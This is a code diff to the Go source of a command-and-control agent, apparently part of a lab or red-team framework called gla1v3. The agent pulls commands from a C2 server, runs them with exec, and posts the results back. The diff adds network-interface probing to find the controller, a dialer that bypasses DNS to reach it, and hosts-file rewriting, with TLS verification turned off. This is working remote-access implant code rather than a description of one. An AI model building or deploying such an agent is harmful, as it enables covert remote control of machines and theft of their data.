@@ -9,6 +9,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"net"
 	"net/http"
 	"os"
 	"os/exec"
@@ -47,7 +48,7 @@ type TaskResult struct {
 }
 
 // executeTask runs a task and sends the result back to C2
-func executeTask(client *http.Client, c2URL, agentID, taskID, cmd string, args []string) {
+func executeTask(client *http.Client, dialCtx func(context.Context, string, string) (net.Conn, error), c2URL, agentID, taskID, cmd string, args []string) {
 	log.Printf("Executing task %s: %s %v", taskID, cmd, args)
 	
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
@@ -90,7 +91,7 @@ func executeTask(client *http.Client, c2URL, agentID, taskID, cmd string, args [
 	resultReq, _ := http.NewRequest("POST", resultURL, bytes.NewReader(resultBody))
 	resultReq.Header.Set("Content-Type", "application/json")
 	
-	// Use a plain HTTPS client for API endpoint (not mTLS for results)
+	// Use a plain HTTPS client for API endpoint with DNS bypass
 	apiClient := &http.Client{
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{
@@ -99,6 +100,7 @@ func executeTask(client *http.Client, c2URL, agentID, taskID, cmd string, args [
 				MinVersion:         tls.VersionTLS12,
 				InsecureSkipVerify: true,
 			},
+			DialContext: dialCtx, // Use DNS bypass
 		},
 		Timeout: 10 * time.Second,
 	}
@@ -286,9 +288,36 @@ func sendTaskResults(client *http.Client, c2Server, agentID string, results []Ta
 
 // detectGateway detects the C2 host IP address
 func detectGateway() (string, error) {
-	var cmd *exec.Cmd
+	// Try to find Host-Only network first (common in VirtualBox/VMware)
+	// These typically use 192.168.56.x or 192.168.57.x ranges
+	if runtime.GOOS == "linux" {
+		cmd := exec.Command("sh", "-c", "ip addr show | grep 'inet ' | awk '{print $2}' | cut -d/ -f1")
+		output, err := cmd.Output()
+		if err == nil {
+			ips := strings.Split(strings.TrimSpace(string(output)), "\n")
+			for _, ip := range ips {
+				ip = strings.TrimSpace(ip)
+				// Skip loopback and common NAT ranges
+				if ip == "127.0.0.1" || strings.HasPrefix(ip, "10.0.2.") {
+					continue
+				}
+				// Prefer 192.168.x.x ranges (common for Host-Only)
+				if strings.HasPrefix(ip, "192.168.") {
+					parts := strings.Split(ip, ".")
+					if len(parts) == 4 {
+						hostIP := parts[0] + "." + parts[1] + "." + parts[2] + ".1"
+						log.Printf("Found Host-Only network interface with IP %s, testing host at %s...", ip, hostIP)
+						if testHostReachable(hostIP) {
+							return hostIP, nil
+						}
+					}
+				}
+			}
+		}
+	}
 	
-	// First, get the default gateway
+	// Fallback to default gateway detection
+	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
 		cmd = exec.Command("cmd", "/C", "route print 0.0.0.0")
 	} else {
@@ -317,37 +346,38 @@ func detectGateway() (string, error) {
 	}
 	
 	// For VM environments, try .1 first (common host machine IP)
-	// Then fall back to actual gateway
 	if strings.Contains(gateway, ".") {
 		parts := strings.Split(gateway, ".")
 		if len(parts) == 4 {
 			hostIP := parts[0] + "." + parts[1] + "." + parts[2] + ".1"
-			
-			// Test if .1 is reachable on port 443
 			log.Printf("Testing host IP %s...", hostIP)
-			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
-			defer cancel()
-			
-			client := &http.Client{
-				Timeout: 2 * time.Second,
-				Transport: &http.Transport{
-					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-				},
-			}
-			
-			req, _ := http.NewRequestWithContext(ctx, "GET", "https://"+hostIP+":443", nil)
-			_, testErr := client.Do(req)
-			
-			if testErr == nil || strings.Contains(testErr.Error(), "certificate") || strings.Contains(testErr.Error(), "handshake") {
+			if testHostReachable(hostIP) {
 				log.Printf("Host IP %s is reachable, using it", hostIP)
 				return hostIP, nil
 			}
-			
 			log.Printf("Host IP %s not reachable, using gateway %s", hostIP, gateway)
 		}
 	}
 	
 	return gateway, nil
+}
+
+// testHostReachable tests if a host IP is reachable on port 443
+func testHostReachable(hostIP string) bool {
+	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
+	defer cancel()
+	
+	client := &http.Client{
+		Timeout: 2 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	
+	req, _ := http.NewRequestWithContext(ctx, "GET", "https://"+hostIP+":443", nil)
+	_, testErr := client.Do(req)
+	
+	return testErr == nil || strings.Contains(testErr.Error(), "certificate") || strings.Contains(testErr.Error(), "handshake")
 }
 
 // setupHosts adds entries to the hosts file for C2 domains
@@ -444,6 +474,9 @@ func cleanupHosts() {
 	log.Println("Cleaned up hosts entries")
 }
 
+// Global variable to store detected host IP
+var detectedHostIP string
+
 func main() {
 	var cert tls.Certificate
 	var caCertPool *x509.CertPool
@@ -459,16 +492,18 @@ func main() {
 		os.Exit(0)
 	}()
 
-	// Detect gateway and setup hosts file
+	// Detect gateway - store it globally for URL construction
 	gateway, err := detectGateway()
 	if err != nil {
 		log.Printf("Warning: Failed to detect gateway: %v", err)
 		log.Println("Proceeding without automatic hosts configuration")
 	} else {
 		log.Printf("Detected gateway: %s", gateway)
+		detectedHostIP = gateway
+		
+		// Try to setup hosts file (will fail without root, but that's okay)
 		if err := setupHosts(gateway); err != nil {
-			log.Printf("Warning: Failed to setup hosts file: %v", err)
-			log.Println("You may need to manually add entries to /etc/hosts or run as root")
+			log.Printf("Info: Could not update /etc/hosts (will use IP directly): %v", err)
 		}
 	}
 
@@ -561,6 +596,26 @@ func main() {
 		apiServerName = "api.gla1v3.local"
 	}
 
+	// Custom dialer to bypass DNS when we have a detected host IP
+	dialer := &net.Dialer{
+		Timeout:   10 * time.Second,
+		KeepAlive: 30 * time.Second,
+	}
+	
+	dialContext := func(ctx context.Context, network, addr string) (net.Conn, error) {
+		// If we detected a host IP and the address contains gla1v3.local, use the IP
+		if detectedHostIP != "" && strings.Contains(addr, "gla1v3.local") {
+			// Extract port from addr (e.g., "c2.gla1v3.local:4443" -> ":4443")
+			parts := strings.Split(addr, ":")
+			if len(parts) >= 2 {
+				port := parts[len(parts)-1]
+				addr = detectedHostIP + ":" + port
+				log.Printf("Bypassing DNS: using %s", addr)
+			}
+		}
+		return dialer.DialContext(ctx, network, addr)
+	}
+
 	// 3. mTLS config (required by default)
 	// Note: InsecureSkipVerify for Traefik's certificate, but still presents client cert
 	tlsConfig := &tls.Config{
@@ -572,8 +627,11 @@ func main() {
 	}
 
 	client := &http.Client{
-		Transport: &http.Transport{TLSClientConfig: tlsConfig},
-		Timeout:   10 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: tlsConfig,
+			DialContext:     dialContext,
+		},
+		Timeout: 10 * time.Second,
 	}
 
 	// Separate TLS config for API (whoami) requests: trust same CA but use API servername
@@ -587,8 +645,11 @@ func main() {
 	}
 
 	whoamiClient := &http.Client{
-		Transport: &http.Transport{TLSClientConfig: apiTLS},
-		Timeout:   6 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: apiTLS,
+			DialContext:     dialContext,
+		},
+		Timeout: 6 * time.Second,
 	}
 
 	whoamiToken := os.Getenv("AGENT_WHOAMI_TOKEN")
@@ -644,7 +705,7 @@ func main() {
 			
 			// Send initial task results
 			if len(taskResults) > 0 {
-				// Use API client with proper TLS config
+				// Use API client with proper TLS config and DNS bypass
 				apiClient := &http.Client{
 					Transport: &http.Transport{
 						TLSClientConfig: &tls.Config{
@@ -654,6 +715,7 @@ func main() {
 							MinVersion:         tls.VersionTLS12,
 							InsecureSkipVerify: true,
 						},
+						DialContext: dialContext, // Use DNS bypass
 					},
 					Timeout: 10 * time.Second,
 				}
@@ -867,7 +929,7 @@ func main() {
 				
 				// Execute each task
 				for _, task := range taskResp.Tasks {
-					go executeTask(client, c2URL, agentID, task.ID, task.Cmd, task.Args)
+					go executeTask(client, dialContext, c2URL, agentID, task.ID, task.Cmd, task.Args)
 				}
 			}
 			resp.Body.Close()
